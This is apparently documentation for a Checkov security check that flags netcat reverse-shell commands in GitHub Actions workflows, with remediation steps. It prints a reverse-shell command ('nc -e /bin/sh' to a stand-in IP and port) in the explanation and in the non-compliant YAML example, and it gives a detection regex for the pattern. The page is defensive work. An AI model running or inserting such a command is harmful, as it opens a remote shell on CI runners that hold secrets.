# CKV_GHA_4: Suspicious use of netcat with IP address
## Severity
**CRITICAL** (score: 9.5/10)

An `nc`/`netcat` invocation against a literal IP address in a workflow step is a textbook reverse-shell pattern, indicating the runner (and any secrets/tokens it holds) may already be under attacker control.

## Summary
This check fails when a GitHub Actions `run:` step invokes `nc` or `netcat` directly against a raw IP address, a pattern strongly associated with reverse-shell or bind-shell payloads.

## Applicability
- **Framework:** GitHub Actions workflow YAML
- **Entities:** `jobs` and `jobs.*.steps[]` — any step with a `run:` key

## Why it matters
`netcat` (`nc`) connecting to a bare IP address is one of the most common building blocks of a reverse shell (e.g., `nc -e /bin/sh 203.0.113.5 4444`), used by attackers to obtain an interactive command channel out of a compromised CI runner back to infrastructure they control. Finding this pattern in a workflow's `run:` script is a strong indicator of:
- A malicious commit or PR that has injected a backdoor into the CI pipeline (CI runners often have elevated network egress and access to secrets, making them an attractive pivot point).
- A compromised third-party GitHub Action or dependency attempting to establish command-and-control (C2) communication.
- Leftover debugging/pentesting code that was accidentally committed and should never run in an automated, secret-bearing pipeline.

Because GitHub-hosted runners typically have outbound internet access and (in many workflows) access to repository/organization secrets via environment variables, a successful reverse shell from CI can lead directly to credential theft, source code exfiltration, or supply-chain compromise of published artifacts.

## How Checkov evaluates this
The check (`ReverseShellNetcat`) applies the regex `(nc|netcat) (\d{1,3}).(\d{1,3}).(\d{1,3}).(\d{1,3})` against the step's `run` text.
- If the pattern matches anywhere in the script (i.e., `nc` or `netcat` followed by a space and four dot-separated 1-3 digit groups, resembling an IPv4 address), the check **FAILS**.
- Otherwise it **PASSES**.

Note the regex uses an unescaped `.` (matches any character, not just a literal dot), so it will also match near-IP-like strings, and it does not validate that the numbers are within 0-255 — it is a coarse heuristic, not a strict IP parser.

## Non-compliant example
```yaml
jobs:
  debug:
    runs-on: ubuntu-latest
    steps:
      - name: "Diagnostics"
        run: |
          nc 203.0.113.5 4444 -e /bin/sh
```

## Remediated example
```yaml
jobs:
  debug:
    runs-on: ubuntu-latest
    steps:
      - name: "Diagnostics"
        run: |
          echo "Diagnostics step: no remote shell invocation"
          curl -sSf https://status.internal.example.com/healthz
```

## Remediation steps
1. Treat any hit from this check as a potential incident, not just a lint failure — investigate how the line got into the workflow (recent commits, PR diffs, third-party action updates).
2. Remove the `nc`/`netcat`-to-IP invocation entirely unless there is a fully legitimate, reviewed reason (e.g., a genuine network connectivity test in an isolated environment) — and if so, prefer a purpose-built health-check tool over raw netcat with shell redirection flags (`-e`, `-c`).
3. If this was found in a workflow triggered by external contributions (e.g., `pull_request_target`, forked PR workflows), audit for and lock down any triggers that let untrusted code run with access to secrets.
4. Rotate any secrets the affected job had access to, and review runner logs/network egress records for evidence of an established connection.
5. Add branch protection and required review on workflow file changes (`.github/workflows/**`) so future modifications are reviewed before merging.
6. Re-run Checkov to confirm the pattern is gone.

## References
- Checkov check source: https://github.com/bridgecrewio/checkov/blob/main/checkov/github_actions/checks/job/ReverseShellNetcat.py
